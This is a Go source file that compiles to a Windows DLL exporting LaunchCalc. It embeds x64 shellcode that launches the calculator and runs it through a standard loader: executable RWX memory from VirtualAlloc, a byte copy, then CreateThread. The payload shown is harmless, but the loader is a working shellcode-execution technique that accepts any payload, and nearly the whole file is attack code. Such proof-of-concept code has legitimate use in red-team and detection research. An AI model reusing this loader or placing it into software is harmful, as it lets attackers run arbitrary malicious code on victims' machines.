//go:build windows
// +build windows

package main

import "C"
import (
	"syscall"
	"unsafe"
)

// CalcShellcode contains x64 Windows shellcode for launching calculator
var CalcShellcode = []byte{
	0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63,
	0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,
	0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
	0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,
	0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,
	0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
}

// executeShellcode allocates memory, copies shellcode, and executes it
func executeShellcode() bool {
	// Get necessary Windows API functions
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	virtualFree := kernel32.MustFindProc("VirtualFree")
	createThread := kernel32.MustFindProc("CreateThread")
	waitForSingleObject := kernel32.MustFindProc("WaitForSingleObject")

	// Constants from Windows API
	const (
		MEM_COMMIT             = 0x1000
		MEM_RESERVE            = 0x2000
		MEM_RELEASE            = 0x8000
		PAGE_EXECUTE_READWRITE = 0x40
		INFINITE               = 0xFFFFFFFF
	)

	// Allocate executable memory
	addr, _, _ := virtualAlloc.Call(
		0,
		uintptr(len(CalcShellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)

	if addr == 0 {
		return false
	}

	// Copy shellcode to allocated memory
	// Using direct memory copy instead of RtlCopyMemory
	shellcodePtr := (*[0x1000]byte)(unsafe.Pointer(addr))
	for i := 0; i < len(CalcShellcode); i++ {
		shellcodePtr[i] = CalcShellcode[i]
	}

	// Create a thread to execute the shellcode
	threadHandle, _, _ := createThread.Call(
		0,    // Default security
		0,    // Default stack size
		addr, // Thread start address
		0,    // No thread parameters
		0,    // Run immediately
		0,    // Thread ID not returned
	)

	if threadHandle == 0 {
		virtualFree.Call(addr, 0, MEM_RELEASE)
		return false
	}

	// Wait for shellcode to finish executing
	waitForSingleObject.Call(threadHandle, INFINITE)

	// Free allocated memory
	virtualFree.Call(addr, 0, MEM_RELEASE)

	return true
}

//export LaunchCalc
func LaunchCalc() bool {
	return executeShellcode()
}

// Required main function - but it won't be used in a DLL
func main() {}
